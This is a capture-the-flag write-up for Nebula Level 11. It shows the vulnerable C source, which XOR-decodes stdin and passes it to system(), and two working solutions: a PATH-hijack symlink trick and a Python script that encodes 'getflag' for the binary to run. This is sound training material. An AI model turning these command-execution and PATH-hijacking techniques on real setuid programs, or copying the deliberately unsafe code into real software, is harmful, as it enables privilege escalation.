# Nebula - Level 11

### About ##

>The /home/flag11/flag11 binary processes standard input and executes a shell command.
>There are two ways of completing this level, you may wish to do both :-)
>To do this level, log in as the level11 account with the password level11 . Files for this level can be found in /home/flag11.

### Source code ###

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv("TEMP");
  pid = getpid();
  
  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid, 
    'A' + (random() % 26), '0' + (random() % 10), 
    'a' + (random() % 26), 'A' + (random() % 26),
    '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
    buffer[i] ^= key;
    key -= buffer[i];
  }

  system(buffer);
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
    errx(1, "reading from stdin");
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
    errx(1, "invalid header");
  }

  length = atoi(line + strlen(CL));
  
  if(length < sizeof(buf)) {
    if(fread(buf, length, 1, stdin) != length) {
      err(1, "fread length");
    }
    process(buf, length);
  } else {
    int blue = length;
    int pink;

    fd = getrand(&path);

    while(blue > 0) {
      printf("blue = %d, length = %d, ", blue, length);

      pink = fread(buf, 1, sizeof(buf), stdin);
      printf("pink = %d\n", pink);

      if(pink <= 0) {
        err(1, "fread fail(blue = %d, length = %d)", blue, length);
      }
      write(fd, buf, pink);

      blue -= pink;
    }  
    
    mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    if(mem == MAP_FAILED) {
      err(1, "mmap");
    }
    process(mem, length);
  }

}
```

## Solutions

### Solution 1

The first way to solve this challenge is by giving the value 1 in the `Content-Length` "header".

In that case, the user is asked to enter one character which is stored in `buffer` and is then sent to the function `process`.

```
level11@nebula:/tmp$ echo -e "Content-Length: 1\nr" | /home/flag11/flag11 >&1sh: $'s\300\207': command not found
level11@nebula:/tmp$ echo -e "Content-Length: 1\nr" | /home/flag11/flag11 >&1
sh: $'s\360Y': command not found
level11@nebula:/tmp$ echo -e "Content-Length: 1\nr" | /home/flag11/flag11 >&1
sh: $'s\020H': command not found
```

The output is, most of the time, useless. But on certain occasions, since `buffer` is uninitialized, there are null pointers conveniently placed which allows to execute commands, just like in the example below.

```
level11@nebula:/tmp$ echo -e "Content-Length: 1\nr" | /home/flag11/flag11 >&1
sh: s: command not found
```

It is then possible to execute `getflag` with a symbolic link. It also requires a bit of luck to get the null pointer in the right place.

```
level11@nebula:/home/flag11$ ln -s /bin/getflag /tmp/s
level11@nebula:/tmp$ export PATH=/tmp:$PATH
level11@nebula:/tmp$ echo -e "Content-Length: 1\nr" | /home/flag11/flag11 >&1
sh: $'s0\242': command not found
level11@nebula:/tmp$ echo -e "Content-Length: 1\nr" | /home/flag11/flag11 >&1
sh: -c: line 0: syntax error near unexpected token `newline'
sh: -c: line 0: `sP('
level11@nebula:/tmp$ echo -e "Content-Length: 1\nr" | /home/flag11/flag11 >&1
sh: $'sP\227': command not found
level11@nebula:/tmp$ echo -e "Content-Length: 1\nr" | /home/flag11/flag11 >&1
getflag is executing on a non-flag account, this doesn't count
```


### Solution 2 ####

The second way to solve this challenge is by giving a value greater than 1024 in the `Content-Length` "header". 1024 is entered in this case.

The program is expecting a string of 1024 characters, which is then encrypted by the function `process` before being executed with the function `system`.

```c
void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
    buffer[i] ^= key;
    key -= buffer[i];
  }

  system(buffer);
}
```

If the function is executed multiple times in a row on the same string, the output is the original string. It can be used to execute the command `getflag` with a simple python script.


```python
import sys

def cipher(string):
        cstring = ""
        key = 1024 & 0xff
        for c in string:
                cc = (ord(c)^key) & 0xff
                key = (key - cc) & 0xff
                cstring += chr(cc)
        return cstring

length = 1024
prog = "getflag\x00"
pad = 'a'*(length-len(prog))

ncrypted = prog
for i in range(127):
        ncrypted = cipher(ncrypted)
print >> sys.stderr, ncrypted           # The string given in argument to ./flag11
print >> sys.stderr, cipher(ncrypted)   # The same string ciphered one more time is the original string prog
print "Content-Length: 1024\n{}".format(ncrypted+pad)
```

Which outputs

```
level11@nebula:/tmp$ python flag11.py | /home/flag11/flag11
g?@?6??&
getflag
blue = 1024, length = 1024, pink = 1024
getflag is executing on a non-flag account, this doesn't count
```
